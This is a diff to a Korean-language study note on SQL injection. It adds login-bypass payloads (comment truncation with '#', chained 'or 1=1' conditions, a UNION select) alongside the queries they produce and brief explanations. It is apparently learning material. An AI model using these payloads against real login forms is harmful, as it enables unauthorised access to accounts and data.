@@ -63,10 +63,35 @@ SQL Injection 공격은 DB와 웹사이트가 연결된 모든 파라미터에�
 ### 3-1-1 주석 처리 우회
 
 (1) `select * from table where id='eric'#' and password='1';`
-(2) `select * from table where id='eric' or '1'='1' # and password ='1';
+입력값 : eric'#
+
+(2) `select * from table where id='eric' or '1'='1' # and password ='1';`
+입력값 : eric' or '1'='1' #
+
+-> and 문을 주석처리하여 인증 과정을 우회함
+
+### 3-1-2 or 구문 우회
+
+(1) `select * from table where id='eric' or '1'='1' and password ='1';`
+입력값 : eric' or '1'='1
+
+-> SQL 문법에선 or 연산자보다 and 연산자가 우선 처리됨. 즉, 후자의 and 문이 처리되면 거짓으로 처리되나, 이후에 처리되는 or 문 때문에 아이디가 eric 이거나 뒤의 and 문 중 하나만 참이어도 결과가 출력됨. 그러므로 해당 SQL 쿼리가 실행되면 eric의 정보가 추출됨
+
+(2) `select * from table where id='eric' or '1'='1' or '1'='1' and password='1';`
+입력값 : eric' or '1'='1' or '1'='1
+
+-> 위에선 eric에 대한 정보만 추출되었다면, 해당 SQL 쿼리는 모든 정보를 추출할 수 있음.
+
+### 3-2 식별&인증 분리 우회
+
+### 3-1-3 union 우회
+
+(1) `select * from table where id='eric' union select '1','2','3','4' # and password='1';`
+입력값 : eric' union select '1','2','3','4' #
+
+-> SQL에서 union은 쿼리를 여러개 실행할 수 있게 만들어주는 문법임. 
 
 
-<mark style='background-color: #f1f8ff'>13dsadas</mark>
 
 
 
